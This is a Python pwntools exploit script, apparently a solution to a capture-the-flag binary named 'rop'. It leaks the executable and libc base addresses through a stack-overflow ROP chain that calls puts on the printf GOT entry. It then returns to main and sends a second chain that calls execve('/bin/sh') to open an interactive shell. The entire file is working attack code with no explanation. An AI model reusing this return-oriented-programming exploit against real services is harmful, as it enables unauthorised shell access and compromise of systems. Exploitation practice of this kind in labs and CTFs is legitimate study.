#!/usr/bin/env python3

from pwn import *
import binascii
import os

exe = context.binary = ELF("rop")

if args.REMOTE:
    libc = ELF("./libc-docker.so")
else:
    libc = ELF("/usr/lib/libc.so.6")

remotehost = ("127.0.0.1", 22226)

context.binary = exe.path
context.terminal = ['st', '-e', 'sh', '-c']

gdbscript = '''
b *main
continue
'''.format(**locals())


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#################################################################

io = start()

rip_offset = 264

main_addr = int(io.recvline(False).split(b":")[1], 0)
exe.address = main_addr - exe.sym.main

log.info("exe base address: %x" % (exe.address, ))


r = ROP(exe)

r.call(exe.sym.puts, [exe.got.printf])
r.call(exe.sym.main)

payload = fit({rip_offset: r.chain()})

io.recvline()
io.sendline(payload)
io.recvline()

libc_printf = u64(io.recvline(False).ljust(8, b"\x00"))
libc.address = libc_printf - libc.sym.printf

log.info("libc base: %x" % (libc.address))


r = ROP([exe, libc])

r.call(libc.sym.execve, [next(libc.search(b"/bin/sh")), 0, 0])

io.recvline()
io.recvline()

payload = fit({rip_offset: r.chain()})
io.sendline(payload)


io.interactive()